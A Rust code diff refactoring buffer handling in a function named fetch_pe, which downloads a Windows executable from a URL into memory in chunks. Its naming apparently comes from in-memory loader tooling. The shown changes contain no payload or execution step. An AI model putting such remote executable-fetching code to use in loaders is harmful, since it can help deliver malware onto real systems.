@@ -18,15 +18,6 @@ fn __str_to_pcwstr(stackstr: &str)->PCWSTR{
     return PCWSTR(__wide_arr.as_ptr() as *const u16);
 }
 
-// u32->usize
-fn __u32_to_usize(val: u32)->usize {
-    // Allocate space for the buffer
-    let u_val: usize = match usize::try_from(val){
-        Ok(_res) => _res,
-        Err(_) => val as usize,
-    };
-    u_val
-}
 
 // close handle
 fn __close_handle(handle: *mut c_void, handle_name: &str) {
@@ -243,23 +234,21 @@ pub fn fetch_pe(url: Url)->Result<Vec<u8>, AppError> {
         }
 
         // Allocate space for the buffer
-        let __usize: usize = __u32_to_usize(__size);
+        let __usize: usize = usize::try_from(__size).expect("[i] Failed to convert u32 -> usize "); 
         let mut out_buf: Vec<u8> = Vec::new();
         match out_buf.try_reserve(__usize){
             Ok(_) => {
-                println!("[i] Receiving Chunk Size: {}", __usize);
+                if out_buf.len() != 0 {
+                    println!("[i] Receiving Chunk Size: {}", __usize);
+                }
             },
             Err(_e) => {
                 let mut _err_msg: String = format!("[!] Out Of Memory");
                 __size = 0;
             }
         }
-        let mut out_buf: Vec<u8> = Vec::with_capacity(__usize+1);
-        
-        // Zero out the memoery
-        for i in out_buf.iter_mut()  {
-            *i = 0u8;
-        }
+        let mut out_buf: Vec<u8> = vec![0; __usize+1];
+
 
         // Read data into buffer
         let __res_read_data: bool;
@@ -275,10 +264,9 @@ pub fn fetch_pe(url: Url)->Result<Vec<u8>, AppError> {
             }
         }
         
-        let _uread: usize = __u32_to_usize(__bytes_read);       
-        
+        let _uread: usize = usize::try_from(__bytes_read).expect("[i] Failed to convert u32 -> usize ");       
+        unsafe {out_buf.set_len(_uread);}
         pe_buf.extend_from_slice(&out_buf[0.._uread]);
-        println!("This works");
 
         if __size <= 0 {
             break;
